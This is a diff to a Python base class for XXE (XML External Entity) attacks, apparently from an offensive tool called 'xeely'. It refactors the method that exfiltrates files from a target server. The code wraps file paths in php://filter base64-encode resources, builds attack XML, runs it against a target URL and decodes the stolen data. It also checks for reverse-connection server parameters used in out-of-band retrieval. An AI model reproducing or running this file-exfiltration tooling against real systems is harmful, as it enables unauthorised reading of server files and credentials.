@@ -5,8 +5,8 @@ from typing import Optional
 
 from xeely.custom_http.server import HTTPServerParams
 from xeely.custom_xml.xml import XML
-from xeely.xxe import cdata
 from xeely.xxe import decoding
+from xeely.xxe.errors import ReverseConnectionParamsNotSpecified
 
 
 class BaseXXEAttack(ABC):
@@ -23,6 +23,7 @@ class BaseXXEAttack(ABC):
         self._encode_data_with_base64 = encode_data_with_base64
         self._use_cdata_tag = use_cdata_tag
         self._http_server_params = http_server_params
+        self._resource = ""
 
     def get_target_url(self):
         return self._target_url
@@ -45,6 +46,9 @@ class BaseXXEAttack(ABC):
     def set_encode_data_with_base64(self, value: bool):
         self._encode_data_with_base64 = value
 
+    def get_resource(self):
+        return self._resource
+
     def _update_resource(self, resource_path: Path) -> str:
         if self._encode_data_with_base64:
             return f"php://filter/convert.base64-encode/resource={resource_path}"
@@ -64,16 +68,15 @@ class BaseXXEAttack(ABC):
             return decoding.decode_data_containing_base64_content(data)
         return data
 
-    def exfiltrate_resource(self, resource_path: Path) -> str:
-        resource = self._update_resource(resource_path)
-        self._configure_xml_for_attack(resource)
+    def _check_params(self):
+        if self._use_cdata_tag and self._http_server_params is None:
+            raise ReverseConnectionParamsNotSpecified()
 
-        if self._use_cdata_tag:
-            cdata.create_cdata_dtd_file()
+    def exfiltrate_resource(self, resource_path: Path) -> str:
+        self._check_params()
+        self._resource = self._update_resource(resource_path)
+        self._configure_xml_for_attack(self._resource)
 
         data = self._decode_data(self._run_attack())
-
-        if self._use_cdata_tag:
-            cdata.delete_cdata_dtd_file()
 
         return data
